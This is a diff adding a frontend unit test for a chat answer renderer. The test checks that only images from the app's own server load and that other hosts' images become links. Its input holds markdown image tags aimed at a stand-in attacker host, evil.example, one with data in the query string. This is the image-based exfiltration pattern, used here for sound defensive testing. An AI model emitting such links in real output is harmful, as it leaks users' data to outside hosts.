@@ -59,6 +59,16 @@ describe('the light over an answer being written', () => {
     expect(container.querySelector('[data-streaming-markdown-caret]')).toBeNull();
   });
 
+  // A picture of an answer only from our own server (spec, section 8.30): another site's is a link, never loaded.
+  it('shows a picture of our own server and names another site’s as a link without loading it', () => {
+    const { container } = render(<AnswerText text={'![план](/app/api/threads/t1/file?path=plan.png) ![x](https://evil.example/x.png?d=4510123456) ![y](//evil.example/y.png)'} streaming={false} failed={false} />);
+    const images = [...container.querySelectorAll('img')];
+    expect(images.map((i) => i.getAttribute('src'))).toEqual(['/app/api/threads/t1/file?path=plan.png']);
+    const links = [...container.querySelectorAll('a')];
+    expect(links.map((a) => a.textContent)).toEqual(['Картинка: evil.example/x.png', 'Картинка: evil.example/y.png']);
+    expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer');
+  });
+
   it('is never on an answer that broke', () => {
     const { container, rerender } = render(<AnswerText text="Начало ответа" streaming failed={false} />);
     rerender(<AnswerText text="Начало ответа" streaming={false} failed />);
